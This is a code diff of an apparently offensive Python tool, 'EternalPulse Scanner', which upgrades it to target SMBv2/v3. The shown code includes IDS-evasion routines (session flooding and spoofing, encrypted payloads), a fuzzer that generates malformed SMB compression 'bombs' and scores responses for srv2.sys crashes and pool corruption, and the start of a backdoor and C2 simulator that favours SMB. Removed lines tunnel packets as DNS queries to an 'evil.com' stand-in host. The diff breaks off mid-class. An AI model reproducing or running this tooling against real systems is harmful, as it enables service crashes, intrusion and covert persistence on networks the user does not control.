@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 """
-EternalPulse Scanner 5.1 - Enhanced network reconnaissance with advanced evasion, fuzzing, and C2 capabilities
+EternalPulse Scanner 5.2 - Enhanced network reconnaissance with advanced SMBv2/v3 exploitation
 New Features:
-- Dynamic results saving with auto-naming
-- Enhanced genetic fuzzing with intensity scaling
-- Improved evasion technique tracking
-- Protocol-specific deep packet inspection
-- Adaptive scanning patterns
-- Comprehensive vulnerability correlation
-- Automated C2 beaconing simulation
-- Real-time debug output showing current targets and activities
+- Automatic SMBv2/v3 dialect negotiation
+- Stateful SMB session handling
+- SMB compression transform fuzzing
+- Compound request chaining
+- Enhanced vulnerability detection for SMBv3.1.1
+- Session ID brute-force resilience
+- SMB-specific evasion techniques
 """
 import asyncio
 import concurrent.futures
@@ -40,18 +39,15 @@ import difflib
 import traceback
 
 # ─── Configuration ──────────────────────────────────────────────────────────
-VERSION = "5.1"
-SIGNATURE = "EternalPulse/5.1 (Advanced Threat Simulation)"
+VERSION = "5.2"
+SIGNATURE = "EternalPulse/5.2 (SMBv3 Specialist)"
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Microsoft-DS/6.1.7601 (Windows Server 2008 R2)",
-    "AppleCoreMedia/1.0.0.20E247 (Macintosh; U; Intel Mac OS X 10_15_7)",
-    "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026)",
-    "Python-urllib/3.10",
-    "curl/7.79.1"
+    "SMBLib/1.0 (Windows NT 10.0; Win64; x64)",
+    "Samba/4.13.0-Debian"
 ]
 PROTOCOL_SIGNATURES = {
-    'SMB': [b'\xffSMB', b'\xfeSMB'],
+    'SMB': [b'\xfeSMB', b'\xfdSMB', b'\xfcSMB'],  # SMBv2/v3 signatures
     'RDP': b'\x03\x00\x00',
     'HTTP': b'HTTP/',
     'FTP': b'220',
@@ -62,16 +58,23 @@ PROTOCOL_SIGNATURES = {
     'POP3': b'+OK'
 }
 EVASION_TECHNIQUES = [
-    "fragmentation", "protocol_tunneling", "traffic_morphing", 
-    "packet_padding", "source_spoofing", "ttl_manipulation",
-    "dns_tunneling", "http_obfuscation", "icmp_covert",
-    "session_splicing", "crypto_stealth", "protocol_misattribution"
+    "smb_session_flood", "compound_request", "asymmetric_encryption", 
+    "credential_reuse", "signature_bypass", "session_spoofing",
+    "encrypted_payload", "compression_overflow", "large_mtu"
 ]
 BACKDOOR_TYPES = [
-    "reverse_shell", "web_shell", "scheduled_task", 
+    "smb_named_pipe", "hidden_share", "scheduled_task", 
     "registry_persistence", "service_install", "wmi_event"
 ]
-C2_PROTOCOLS = ["https", "dns", "smb", "icmp", "tor"]
+C2_PROTOCOLS = ["smb", "https", "dns", "icmp"]
+SMB_DIALECTS = [
+    b"\x02\x02",  # SMB 2.0.2
+    b"\x02\x10",  # SMB 2.1
+    b"\x02\x22",  # SMB 2.2.2
+    b"\x02\x24",  # SMB 3.0
+    b"\x02\x26",  # SMB 3.0.2
+    b"\x02\x28"   # SMB 3.1.1
+]
 # ────────────────────────────────────────────────────────────────────────────
 
 # ─── Optional Dependencies ──────────────────────────────────────────────────
@@ -91,12 +94,6 @@ try:
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
-
-try:
-    import nmap
-    NMAP_AVAILABLE = True
-except ImportError:
-    NMAP_AVAILABLE = False
 
 try:
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -171,127 +168,155 @@ class ThreatLevel(Enum):
     CRITICAL = 4
 
 class EvasionEngine:
-    """Advanced evasion techniques with dynamic strategy selection"""
+    """Advanced evasion techniques with SMB-specific strategies"""
     def __init__(self, stealth_level: int = 3):
         self.stealth_level = stealth_level
         self.technique_weights = {
-            "fragmentation": 0.8,
-            "protocol_tunneling": 0.6,
-            "traffic_morphing": 0.9,
-            "packet_padding": 0.7,
-            "source_spoofing": 0.5,
-            "ttl_manipulation": 0.4,
-            "dns_tunneling": 0.3,
-            "http_obfuscation": 0.6,
-            "icmp_covert": 0.2,
-            "session_splicing": 0.4,
-            "crypto_stealth": 0.3,
-            "protocol_misattribution": 0.5
+            "smb_session_flood": 0.9,
+            "compound_request": 0.8,
+            "asymmetric_encryption": 0.7,
+            "credential_reuse": 0.6,
+            "signature_bypass": 0.7,
+            "session_spoofing": 0.8,
+            "encrypted_payload": 0.9,
+            "compression_overflow": 0.8,
+            "large_mtu": 0.6
         }
-        self.counters = {tech: 0 for tech in EVASION_TECHNIQUES}
-        
+        self.counters = {tech: 0 for tech in self.technique_weights}
+        self.session_ids = {}
+
     def select_techniques(self) -> List[str]:
         """Select evasion techniques based on stealth level and weights"""
-        if self.stealth_level == 1:  # Low stealth
-            return random.sample(EVASION_TECHNIQUES[:4], 2)
-        
-        # Weighted selection based on stealth level
         selected = []
         for tech, weight in self.technique_weights.items():
-            adjusted_weight = weight * (self.stealth_level / 4)
-            if random.random() < adjusted_weight:
+            adjusted = weight * (self.stealth_level / 4)
+            if random.random() < adjusted:
                 selected.append(tech)
                 self.counters[tech] += 1
-        return selected or ["traffic_morphing"]
-    
+        return selected or ["encrypted_payload", "compound_request"]
+
     def apply_evasion(self, packet: bytes, protocol: str, target_ip: str) -> bytes:
         """Apply selected evasion techniques to a packet"""
-        techniques = self.select_techniques()
+        if protocol != "SMB":
+            return packet
         processed = packet
-        
-        for tech in techniques:
-            if tech == "fragmentation" and SCAPY_AVAILABLE:
-                # Will fragment during send instead
-                pass
-            elif tech == "traffic_morphing":
-                processed = self.morph_traffic(processed, protocol)
-            elif tech == "packet_padding":
-                processed = self.add_packet_padding(processed)
-            elif tech == "source_spoofing" and SCAPY_AVAILABLE:
-                # Will handle during send
-                pass
-            elif tech == "ttl_manipulation" and SCAPY_AVAILABLE:
-                # Will handle during send
-                pass
-            elif tech == "dns_tunneling" and protocol in ["HTTP", "SMB"]:
-                processed = self.dns_tunnel_obfuscate(processed)
-            elif tech == "http_obfuscation" and protocol in ["SMB", "RDP"]:
-                processed = self.http_obfuscate(processed)
-            elif tech == "crypto_stealth" and CRYPTO_AVAILABLE:
+        for tech in self.select_techniques():
+            if tech == "smb_session_flood":
+                processed = self.add_session_flood(processed)
+            elif tech == "compound_request":
+                processed = self.add_compound_requests(processed)
+            elif tech == "asymmetric_encryption":
+                processed = self.add_asymmetric_crypto(processed)
+            elif tech == "session_spoofing":
+                processed = self.spoof_session_id(processed, target_ip)
+            elif tech == "encrypted_payload" and CRYPTO_AVAILABLE:
                 processed = self.crypto_obfuscate(processed)
-            elif tech == "protocol_misattribution":
-                processed = self.misattribute_protocol(processed, protocol)
-                
+            elif tech == "compression_overflow":
+                processed = self.add_compression_header(processed)
+            elif tech == "large_mtu":
+                processed = self.pad_to_large_mtu(processed)
         return processed
-    
-    def morph_traffic(self, packet: bytes, protocol: str) -> bytes:
-        """Morph traffic to resemble other protocols"""
-        morph_target = random.choice(["HTTP", "DNS", "ICMP"])
-        
-        if morph_target == "HTTP":
-            host = f"{random.randint(1,255)}.{random.randint(1,255)}.com"
-            http_header = f"POST /{uuid.uuid4().hex} HTTP/1.1\r\nHost: {host}\r\n".encode()
-            return http_header + packet
-        elif morph_target == "DNS" and SCAPY_AVAILABLE:
-            return self._build_dns_encoded(packet)
-        return packet
-    
-    def add_packet_padding(self, packet: bytes) -> bytes:
-        """Add random padding to packets"""
-        padding_size = random.randint(0, 512)
-        padding = os.urandom(padding_size)
-        return packet + padding
-    
-    def dns_tunnel_obfuscate(self, packet: bytes) -> bytes:
-        """Encode packet in DNS query format"""
-        encoded = base64.b32encode(packet).decode().rstrip('=')
-        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
-        query = ".".join(chunks) + ".evil.com"
-        return query.encode()
-    
-    def http_obfuscate(self, packet: bytes) -> bytes:
-        """Obfuscate within HTTP traffic"""
-        boundary = f"----{uuid.uuid4().hex}"
-        header = f"POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data; boundary={boundary}\r\n".encode()
-        body = f"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"data.bin\"\r\n\r\n".encode()
-        footer = f"\r\n--{boundary}--\r\n".encode()
-        return header + body + packet + footer
-    
-    def crypto_obfuscate(self, packet: bytes) -> bytes:
-        """Lightweight encryption for stealth"""
-        key = os.urandom(16)
-        iv = os.urandom(16)
-        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-        encryptor = cipher.encryptor()
-        encrypted = encryptor.update(packet) + encryptor.finalize()
-        return iv + encrypted
-    
-    def misattribute_protocol(self, packet: bytes, actual_protocol: str) -> bytes:
-        """Alter packet to appear as different protocol"""
-        if actual_protocol == "SMB":
-            # Make SMB look like RDP
-            return b"\x03\x00\x00" + struct.pack(">H", len(packet)) + packet
-        elif actual_protocol == "RDP":
-            # Make RDP look like HTTP
-            return b"GET /" + base64.b64encode(packet) + b" HTTP/1.1\r\n\r\n"
+
+    def add_session_flood(self, packet: bytes) -> bytes:
+        """Add multiple session setup requests"""
+        flood = [packet] * random.randint(3, 10)
+        return b"".join(flood)
+
+    def add_compound_requests(self, packet: bytes) -> bytes:
+        """Chain multiple SMB commands in single packet"""
+        if len(packet) < 64:
+            return packet
+        header, body = packet[:64], packet[64:]
+        size = len(body) // 2 or 1
+        chunks = [body[i:i+size] for i in range(0, len(body), size)]
+        cmds = chunks[: random.randint(2, 4)]
+        compound = header
+        offset = 64 + len(header)
+        for i, cmd in enumerate(cmds):
+            nxt = 0 if i == len(cmds) - 1 else offset
+            compound += struct.pack("<I", nxt) + cmd
+            offset += len(cmd)
+        return compound
+
+    def add_asymmetric_crypto(self, packet: bytes) -> bytes:
+        """Simulate asymmetric encryption patterns"""
+        return packet + b"\x00" * random.randint(128, 512)
+
+    def spoof_session_id(self, packet: bytes, target_ip: str) -> bytes:
+        """Use valid session IDs from previous connections"""
+        if target_ip in self.session_ids:
+            sid = random.choice(self.session_ids[target_ip])
+            return packet[:44] + sid + packet[52:]
         return packet
 
+    def crypto_obfuscate(self, packet: bytes) -> bytes:
+        """Lightweight encryption for stealth"""
+        key, iv = os.urandom(32), os.urandom(16)
+        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+        enc = cipher.encryptor()
+        return iv + enc.update(packet) + enc.finalize()
+
+    def add_compression_header(self, packet: bytes) -> bytes:
+        """Add SMB compression transform header"""
+        header = struct.pack(
+            "<4s I H H I",
+            b"\xfcSMB",
+            random.randint(0x10000000, 0xFFFFFFFF),
+            random.choice([0x0001, 0x0002, 0x0003]),
+            0,
+            len(packet)
+        )
+        return header + packet
+
+    def pad_to_large_mtu(self, packet: bytes) -> bytes:
+        """Pad packet to 8KB+ MTU size"""
+        pad_len = max(0, 8192 - len(packet))
+        return packet + os.urandom(pad_len)
 class ProtocolGrammar:
-    """Grammar definitions for protocol-aware fuzzing"""
+    """Grammar definitions for protocol-aware fuzzing with SMBv2/v3 focus"""
     @staticmethod
     def get_grammar(protocol: str) -> Dict[str, List[bytes]]:
         """Get grammar rules for a specific protocol"""
         grammars = {
+            "SMB": {
+                "header": [
+                    b"\xfeSMB" + os.urandom(60),  # SMBv2 header
+                    b"\xfdSMB" + os.urandom(60),  # SMBv3 header
+                    b"\xfcSMB" + struct.pack(">I", 0xFFFFFFF) + os.urandom(56)  # Compression header
+                ],
+                "command": [
+                    b"\x00\x00",  # Negotiate
+                    b"\x01\x00",  # Session Setup
+                    b"\x03\x00",  # Tree Connect
+                    b"\x05\x00",  # Create
+                    b"\x06\x00",  # Close
+                    b"\x08\x00",  # Read
+                    b"\x09\x00",  # Write
+                    b"\x0e\x00",  # IOCTL
+                    b"\x10\x00",  # Query Directory
+                    b"\x14\x00"   # Change Notify
+                ],
+                "dialect": SMB_DIALECTS,
+                "flags": [
+                    b"\x00\x00\x00\x00",  # No flags
+                    b"\x08\x00\x00\x00",  # Signed
+                    b"\x10\x00\x00\x00",  # Async
+                    b"\x20\x00\x00\x00"   # Chained
+                ],
+                "session_id": [os.urandom(8)],
+                "tree_id": [os.urandom(4)],
+                "payload": [
+                    b"\\pipe\\" + os.urandom(8).hex().encode(),
+                    b"\\share\\" + os.urandom(12).hex().encode() + b"\x00",
+                    b"\\IPC$\\" + os.urandom(16).hex().encode(),
+                    b"\\admin$\\" + os.urandom(16).hex().encode() + b"\x00"
+                ],
+                "compression": [
+                    b"\x01\x00" + struct.pack(">I", 0xFFFFFFFF),  # LZNT1 with max size
+                    b"\x02\x00" + struct.pack(">I", 0x10000000),   # LZ77 with large size
+                    b"\x03\x00" + os.urandom(4)                    # Random algorithm
+                ]
+            },
             "HTTP": {
                 "method": [b"GET", b"POST", b"PUT", b"DELETE", b"HEAD", b"OPTIONS"],
                 "path": [b"/", b"/index.html", b"/" + os.urandom(4).hex().encode(), b"/" + b"../"*5],
@@ -307,102 +332,113 @@ class ProtocolGrammar:
                 ],
                 "body": [b"", b"name=value", os.urandom(128), b"<xml>test</xml>"]
             },
-            "SMB": {
-                "command": [b"\x72", b"\x73", b"\x74", b"\x75"],  # Negotiate, Session Setup, Tree Connect, Create
-                "flags": [b"\x18", b"\x02", b"\x04", b"\x20"],
-                "signature": [os.urandom(8)],
-                "tree_id": [b"\x00\x00", b"\xff\xff", os.urandom(2)],
-                "session_id": [os.urandom(4)],
-                "payload": [os.urandom(64)]
-            },
-            "DNS": {
-                "transaction_id": [os.urandom(2)],
-                "flags": [b"\x01\x00", b"\x80\x00"],  # Standard query, Response
-                "questions": [b"\x00\x01"],  # 1 question
-                "answer_rrs": [b"\x00\x00", b"\x00\x01"],
-                "authority_rrs": [b"\x00\x00"],
-                "additional_rrs": [b"\x00\x00"],
-                "query": [b"\x07example\x03com\x00", b"\x04test\x00"],
-                "qtype": [b"\x00\x01", b"\x00\x0c"],  # A, PTR
-                "qclass": [b"\x00\x01"]  # IN
-            },
-            "SSH": {
-                "protocol_version": [b"SSH-2.0-OpenSSH_7.9", b"SSH-1.99-OpenSSH", b"SSH-2.0-Malformed"],
-                "software": [b"OpenSSH_7.9", b"Dropbear_2019.78", b"libssh_0.8.7"],
-                "methods": [
-                    b"diffie-hellman-group14-sha1,diffie-hellman-group1-sha1",
-                    b"curve25519-sha256,curve25519-sha256@libssh.org",
-                    os.urandom(32)
-                ]
-            },
             "RDP": {
                 "cookie": [b"mstshash=nmap"],
                 "request": [b"\x01\x00", b"\x08\x00", b"\x03\x00\x00\x13"],
                 "flags": [b"\x0e\xe0", b"\x0e\xc0"],
                 "length": [b"\x00\x00", b"\x13\x00"],
                 "version": [b"\x04\x00\x08\x00", b"\x01\x00\x00\x00"]
-            },
-            "TLS": {
-                "handshake": [b"\x16\x03\x01"],
-                "version": [b"\x03\x01", b"\x03\x02", b"\x03\x03"],
-                "cipher_suites": [os.urandom(32), b"\x00\x0a\x00\x39\x00\x38\x00\x35"],
-                "compression": [b"\x00", b"\x01"],
-                "extensions": [os.urandom(64)]
             }
         }
         return grammars.get(protocol, {})
 
 class GeneticFuzzer:
-    """Genetic algorithm-powered protocol fuzzer with enhanced capabilities"""
-    def __init__(self, protocol: str, host: str, port: int, intensity: int = 3):
+    """Genetic algorithm-powered protocol fuzzer with SMBv2/v3 enhancements"""
+    def __init__(self, protocol: str, host: str, port: int, intensity: int = 5):
         self.protocol = protocol
         self.host = host
         self.port = port
         self.intensity = intensity
-        self.population_size = 100 + (intensity - 3) * 50  # Scale with intensity
-        self.mutation_rate = 0.25 + (intensity - 3) * 0.05  # Higher mutation rate
-        self.generations = 10 + (intensity - 3) * 5  # More generations for convergence
+        self.population_size = 200 + (intensity - 3) * 100  # Scale with intensity
+        self.mutation_rate = 0.3 + (intensity - 3) * 0.05  # Higher mutation rate
+        self.generations = 15 + (intensity - 3) * 8  # More generations for SMB
         self.crashes = []
         self.anomalies = []
         self.coverage = set()
-        self.stateful = random.choice([True, False])
+        self.stateful = True if protocol == "SMB" else False
         self.session = None
         self.grammar = ProtocolGrammar.get_grammar(protocol)
         self.population = self.initialize_population()
+        self.established_sessions = []
         
     def initialize_population(self) -> List[bytes]:
-        """Create initial population of fuzzing payloads with grammar-based generation"""
+        """Create initial population of fuzzing payloads with SMBv2/v3 focus"""
         population = []
         
-        # Create 40% grammar-based payloads
-        for _ in range(int(self.population_size * 0.4)):
-            population.append(self.generate_from_grammar())
-            
-        # Create 30% mutated protocol templates
-        for _ in range(int(self.population_size * 0.3)):
-            template = self.get_protocol_template()
-            population.append(self.mutate_payload(template))
-            
-        # Create 20% cross-protocol mutations
-        for _ in range(int(self.population_size * 0.2)):
-            other_proto = random.choice(["HTTP", "SMB", "DNS", "SSH", "RDP", "TLS"])
-            template = self.get_protocol_template(other_proto)
-            population.append(self.mutate_payload(template))
-            
-        # Create 10% completely random payloads
-        for _ in range(int(self.population_size * 0.1)):
-            size = random.randint(64, 2048)  # Larger payloads for better coverage
-            population.append(os.urandom(size))
-            
+        # SMB-specific initialization
+        if self.protocol == "SMB":
+            # 60% grammar-based SMB payloads
+            for _ in range(int(self.population_size * 0.6)):
+                population.append(self.generate_from_grammar())
+                
+            # 20% mutated SMB templates
+            for _ in range(int(self.population_size * 0.2)):
+                template = self.get_protocol_template("SMB")
+                population.append(self.mutate_payload(template))
+                
+            # 10% compound requests
+            for _ in range(int(self.population_size * 0.1)):
+                population.append(self.generate_compound_request())
+                
+            # 10% compression bombs
+            for _ in range(int(self.population_size * 0.1)):
+                population.append(self.generate_compression_bomb())
+        else:
+            # Default initialization for other protocols
+            for _ in range(int(self.population_size * 0.4)):
+                population.append(self.generate_from_grammar())
+                
+            for _ in range(int(self.population_size * 0.3)):
+                template = self.get_protocol_template()
+                population.append(self.mutate_payload(template))
+                
+            for _ in range(int(self.population_size * 0.2)):
+                other_proto = random.choice(["HTTP", "RDP"])
+                template = self.get_protocol_template(other_proto)
+                population.append(self.mutate_payload(template))
+                
+            for _ in range(int(self.population_size * 0.1)):
+                size = random.randint(64, 4096)
+                population.append(os.urandom(size))
+                
         return population
     
     def generate_from_grammar(self) -> bytes:
-        """Generate payload using protocol grammar"""
+        """Generate payload using protocol grammar with SMBv2/v3 focus"""
         if not self.grammar:
             return self.get_protocol_template()
             
         payload = b""
-        if self.protocol == "HTTP":
+        if self.protocol == "SMB":
+            # Build SMBv2/v3 header
+            payload += random.choice(self.grammar["header"])
+            
+            # Add command-specific payload
+            command = random.choice(self.grammar["command"])
+            payload += command
+            
+            if command == b"\x00\x00":  # Negotiate
+                payload += random.choice(self.grammar["dialect"])
+                payload += b"\x00\x00"  # SecurityMode
+                payload += b"\x00\x00"  # Capabilities
+                payload += os.urandom(16)  # ClientGuid
+                payload += struct.pack("<Q", 0)  # ClientStartTime
+                
+            elif command == b"\x01\x00":  # Session Setup
+                payload += b"\x00"  # Flags
+                payload += b"\x00"  # SecurityMode
+                payload += b"\x00\x00"  # Capabilities
+                payload += random.choice(self.grammar["session_id"])
+                payload += os.urandom(8)  # PreviousSessionId
+                payload += random.choice(self.grammar["payload"])
+                
+            else:  # Other commands
+                payload += random.choice(self.grammar["flags"])
+                payload += random.choice(self.grammar["session_id"])
+                payload += random.choice(self.grammar["tree_id"])
+                payload += random.choice(self.grammar["payload"])
+                
+        elif self.protocol == "HTTP":
             method = random.choice(self.grammar["method"])
             path = random.choice(self.grammar["path"])
             version = random.choice(self.grammar["version"])
@@ -418,64 +454,82 @@ class GeneticFuzzer:
             if method == b"POST" or method == b"PUT":
                 payload += random.choice(self.grammar["body"])
                 
-        elif self.protocol == "SMB":
-            payload = random.choice(self.grammar["command"])
+        elif self.protocol == "RDP":
+            payload = random.choice(self.grammar["request"])
             payload += random.choice(self.grammar["flags"])
-            payload += b"\x00\x00\x00\x00"  # Flags2
-            payload += random.choice(self.grammar["signature"])
-            payload += random.choice(self.grammar["tree_id"])
-            payload += random.choice(self.grammar["session_id"])
-            payload += b"\x00\x00"  # Process ID
-            payload += b"\x00\x00"  # User ID
-            payload += b"\x00\x00"  # Multiplex ID
-            payload += random.choice(self.grammar["payload"])
-        elif self.protocol == "TLS":
-            payload = random.choice(self.grammar["handshake"])
-            payload += struct.pack(">H", random.randint(512, 4096))  # Length
+            payload += random.choice(self.grammar["length"])
             payload += random.choice(self.grammar["version"])
-            payload += os.urandom(32)  # Random
-            payload += random.choice(self.grammar["cipher_suites"])
-            payload += random.choice(self.grammar["compression"])
-            payload += random.choice(self.grammar["extensions"])
+            payload += random.choice(self.grammar["cookie"])
             
         return payload
     
     def get_protocol_template(self, protocol: str = None) -> bytes:
-        """Get base protocol template"""
+        """Get base protocol template with SMBv2/v3 focus"""
         proto = protocol or self.protocol
         if proto == "SMB":
-            return b"\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00"
+            # SMBv2 Negotiate Protocol Request
+            return (
+                b"\xfeSMB\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00\x00\x00\x00\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00"
+                b"\x02\x02\x02\x22\x02\x24\x02\x26\x02\x28"  # Dialects
+            )
         elif proto == "RDP":
             return b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00"
         elif proto == "HTTP":
             return b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
-        elif proto == "DNS":
-            return b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
-        elif proto == "SSH":
-            return b"SSH-2.0-OpenSSH_7.9p1\r\n"
-        elif proto == "TLS":
-            return b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03"
-        return os.urandom(256)  # Larger default payload
+        return os.urandom(512)
+    
+    def generate_compound_request(self) -> bytes:
+        """Generate compound SMB request with multiple commands"""
+        base = self.get_protocol_template("SMB")
+        commands = [
+            self.generate_from_grammar()[64:],  # Tree Connect
+            self.generate_from_grammar()[64:],  # Create
+            self.generate_from_grammar()[64:],  # Read
+            self.generate_from_grammar()[64:]   # Close
+        ]
+        
+        # Build compound packet
+        compound = base
+        next_offset = 64 + len(base)
+        for i, cmd in enumerate(commands):
+            if i == len(commands) - 1:
+                next_offset = 0
+            compound += struct.pack("<I", next_offset) + cmd
+            next_offset += len(cmd)
+            
+        return compound
+    
+    def generate_compression_bomb(self) -> bytes:
+        """Generate SMB compression bomb payload"""
+        header = struct.pack(
+            "<4s I H H I",
+            b'\xfcSMB',        # Transform header
+            0xFFFFFFFF,         # OriginalSize (max value)
+            0x0001,             # LZNT1 algorithm
+            0,                  # Flags
+            4096                # Payload length
+        )
+        # Malformed LZNT1 data that expands massively
+        compressed = b'\x00' * 128 + b'\x1F\x00' + b'\x00' * 32 + b'\xFF\xFF'
+        return header + compressed
     
     def fitness(self, payload: bytes, response: bytes, response_time: float) -> float:
-        """Evaluate payload effectiveness based on response"""
+        """Evaluate payload effectiveness based on response with SMB focus"""
         score = 0
         
-        # Response length anomaly
-        if len(response) < 10 or len(response) > 4096:
-            score += 30
-            
-        # Error indicators
-        error_phrases = [
-            b"error", b"exception", b"fail", b"invalid", b"crash", 
-            b"overflow", b"corrupt", b"segmentation", b"core dumped",
-            b"access violation", b"buffer overrun", b"denied", b"illegal",
-            b"malformed", b"unexpected", b"vulnerability", b"exploit"
+        # Critical error indicators for SMB
+        smb_errors = [
+            b"STATUS_INVALID_PARAMETER", b"STATUS_ACCESS_VIOLATION", 
+            b"STATUS_BUFFER_OVERFLOW", b"STATUS_STACK_BUFFER_OVERRUN",
+            b"srv2.sys", b"pool corruption"
         ]
-        for phrase in error_phrases:
-            if phrase in response:
-                score += 25
-                break  # Only count once
+        
+        for error in smb_errors:
+            if error in response:
+                score += 40
+                break
                 
         # Protocol violation
         if not any(response.startswith(sig) for sig in PROTOCOL_SIGNATURES.get(self.protocol, [b""])):
@@ -493,6 +547,12 @@ class GeneticFuzzer:
             score += 45
             self.coverage.add(response_hash)
             
+        # Session ID leak detection
+        if b"SessionId" in response and b"TreeId" in response:
+            session_match = re.search(b"SessionId=[0-9a-fA-F-]{36}", response)
+            if session_match:
+                score += 30
+                
         return score
     
     def crossover(self, parent1: bytes, parent2: bytes) -> bytes:
@@ -502,7 +562,7 @@ class GeneticFuzzer:
             return parent1 or parent2
             
         # Select crossover strategy
-        strategy = random.choice(["single_point", "two_point", "uniform", "splice"])
+        strategy = random.choice(["single_point", "two_point", "splice"])
         
         if strategy == "single_point":
             split = random.randint(1, min_len - 1)
@@ -513,28 +573,19 @@ class GeneticFuzzer:
             split2 = random.randint(split1 + 1, min_len - 1)
             return parent1[:split1] + parent2[split1:split2] + parent1[split2:]
             
-        elif strategy == "splice":  # New strategy: insert segment
+        else:  # splice crossover
             segment_start = random.randint(0, len(parent2) - 1)
             segment_end = random.randint(segment_start + 1, len(parent2))
             segment = parent2[segment_start:segment_end]
             insert_pos = random.randint(0, len(parent1))
             return parent1[:insert_pos] + segment + parent1[insert_pos:]
-            
-        else:  # uniform crossover
-            child = bytearray()
-            for i in range(min_len):
-                if random.random() < 0.5:
-                    child.append(parent1[i])
-                else:
-                    child.append(parent2[i])
-            return bytes(child)
     
     def mutate_payload(self, payload: bytes) -> bytes:
-        """Apply random mutations to payload using multiple strategies"""
+        """Apply random mutations to payload with SMB-specific strategies"""
         if not payload:
-            return os.urandom(256)
+            return os.urandom(512)
             
-        strategy = random.choice(["bit_flip", "byte_flip", "block_remove", "block_duplicate", "insert_random", "arithmetic"])
+        strategy = random.choice(["bit_flip", "byte_flip", "block_remove", "block_duplicate", "compression_inject"])
         payload_arr = bytearray(payload)
         
         if strategy == "bit_flip":
@@ -554,51 +605,37 @@ class GeneticFuzzer:
                 
         elif strategy == "block_remove":
             # Remove a block of bytes
-            if len(payload_arr) > 10:
-                start = random.randint(0, len(payload_arr) - 5)
-                end = random.randint(start + 1, min(start + 100, len(payload_arr)))
+            if len(payload_arr) > 64:
+                start = random.randint(0, len(payload_arr) - 32)
+                end = random.randint(start + 1, min(start + 256, len(payload_arr)))
                 del payload_arr[start:end]
                 
         elif strategy == "block_duplicate":
             # Duplicate a block of bytes
-            if len(payload_arr) < 4096:
-                start = random.randint(0, len(payload_arr) - 5)
-                end = random.randint(start + 1, min(start + 100, len(payload_arr)))
+            if len(payload_arr) < 65535:
+                start = random.randint(0, len(payload_arr) - 32)
+                end = random.randint(start + 1, min(start + 256, len(payload_arr)))
                 block = payload_arr[start:end]
                 insert_pos = random.randint(0, len(payload_arr))
                 payload_arr = payload_arr[:insert_pos] + block + payload_arr[insert_pos:]
                 
-        elif strategy == "insert_random":
-            # Insert random bytes
-            insert_size = random.randint(1, 256)
-            insert_pos = random.randint(0, len(payload_arr))
-            random_bytes = os.urandom(insert_size)
-            payload_arr = payload_arr[:insert_pos] + random_bytes + payload_arr[insert_pos:]
-            
-        elif strategy == "arithmetic":  # New strategy: arithmetic mutation
-            # Mutate numbers in the payload (e.g., sizes, counts)
-            num_mutations = max(1, int(len(payload_arr) * 0.1))
-            for _ in range(num_mutations):
-                idx = random.randint(0, len(payload_arr) - 4)
-                # Treat next 4 bytes as integer and mutate
-                try:
-                    original = struct.unpack(">I", payload_arr[idx:idx+4])[0]
-                    mutated = random.choice([
-                        original + 1,
-                        original - 1,
-                        original * 2,
-                        0,
-                        0xffffffff,
-                        random.randint(0, 0xffffffff)
-                    ])
-                    payload_arr[idx:idx+4] = struct.pack(">I", mutated)
-                except:
-                    pass
-                    
+        elif strategy == "compression_inject" and self.protocol == "SMB":
+            # Inject compression transform header
+            if len(payload_arr) > 64 and payload_arr[0:4] != b'\xfcSMB':
+                comp_header = struct.pack(
+                    "<4s I H H I",
+                    b'\xfcSMB',
+                    random.randint(0x10000000, 0xFFFFFFFF),
+                    random.choice([0x0001, 0x0002, 0x0003]),
+                    0,
+                    len(payload_arr) - 64
+                )
+                payload_arr = comp_header + payload_arr[64:]
+                
         return bytes(payload_arr)
     
     def evolve(self, responses: Dict[bytes, Tuple[bytes, float]]) -> List[bytes]:
-        """Evolve population based on response fitness"""
+        """Evolve population based on response fitness with SMB focus"""
         if not responses:
             return self.population
             
@@ -631,8 +668,8 @@ class GeneticFuzzer:
                 
         # Adaptive mutation rate adjustment
         avg_fitness = sum(fitness_scores.values()) / len(fitness_scores)
-        if avg_fitness < 50:  # Low fitness, increase mutation
-            self.mutation_rate = min(0.6, self.mutation_rate * 1.3)
+        if avg_fitness < 60:  # Low fitness, increase mutation
+            self.mutation_rate = min(0.7, self.mutation_rate * 1.3)
         else:
             self.mutation_rate = max(0.1, self.mutation_rate * 0.9)
             
@@ -641,11 +678,11 @@ class GeneticFuzzer:
     def minimize_crash_payload(self, payload: bytes) -> bytes:
         """Minimize crash-inducing payload to smallest reproducible case"""
         minimized = payload
-        if len(payload) < 10:
+        if len(payload) < 32:
             return minimized
             
-        # Try removing chunks
-        chunk_size = max(16, len(payload) // 10)
+        # Delta debugging for SMB crashes
+        chunk_size = max(32, len(payload) // 4)
         for i in range(0, len(payload), chunk_size):
             test_payload = payload[:i] + payload[i+chunk_size:]
             
@@ -665,41 +702,37 @@ class GeneticFuzzer:
         return minimized
 
 class BackdoorSimulator:
-    """Advanced backdoor installation and C2 simulation"""
+    """Advanced backdoor installation and C2 simulation with SMB focus"""
     def __init__(self, target: str, protocol: str, port: int):
         self.target = target
         self.protocol = protocol
         self.port = port
         self.backdoor_type = random.choice(BACKDOOR_TYPES)
-        self.c2_protocol = random.choice(C2_PROTOCOLS)
+        self.c2_protocol = "smb"  # Prefer SMB for C2
